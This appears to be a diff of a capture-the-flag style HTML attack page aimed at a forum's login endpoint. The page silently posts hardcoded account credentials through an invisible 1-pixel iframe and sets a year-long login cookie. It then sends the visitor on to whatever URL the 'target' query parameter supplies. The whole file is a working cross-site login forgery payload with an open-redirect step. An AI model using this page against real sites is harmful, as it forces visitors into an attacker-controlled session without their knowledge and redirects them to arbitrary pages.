@@ -1,10 +1,11 @@
-<!doctype html><html><body>GENERIC_LOGIN_BRIDGE
-<form id="f" method="POST" action="https://bbs888-a.mmmkkkooo0088.cc/baidu/login.php?">
+<!doctype html><html><body>IFRAME_LOGIN_BRIDGE
+<form id="f" method="POST" action="https://bbs888-a.mmmkkkooo0088.cc/baidu/login.php?" target="authframe">
 <input type="hidden" name="step" value="2"><input type="hidden" name="forward" value="">
-<input type="hidden" id="jump" name="jumpurl" value="https://bbs888-a.mmmkkkooo0088.cc/baidu/read.php?tid=71465">
+<input type="hidden" id="jump" name="jumpurl" value="https://bbs888-a.mmmkkkooo0088.cc/baidu/index.php">
 <input type="hidden" name="lgt" value="0"><input type="hidden" name="hideid" value="0"><input type="hidden" name="cktime" value="31536000">
 <input name="pwuser" value="ctf273a"><input name="pwpwd" value="Ctf273!a">
-</form><script>
-var t=new URLSearchParams(location.search).get('target'); if(t) document.getElementById('jump').value=t;
+</form><iframe name="authframe" id="authframe" src="about:blank" style="width:1px;height:1px;opacity:0"></iframe><script>
+var t=new URLSearchParams(location.search).get('target'); if(!t) t='https://bbs888-a.mmmkkkooo0088.cc/baidu/read.php?tid=71465'; document.getElementById('jump').value='https://bbs888-a.mmmkkkooo0088.cc/baidu/index.php';
 setTimeout(function(){document.getElementById('f').submit();},100);
+setTimeout(function(){location.href=t;},5000);
 </script></body></html>
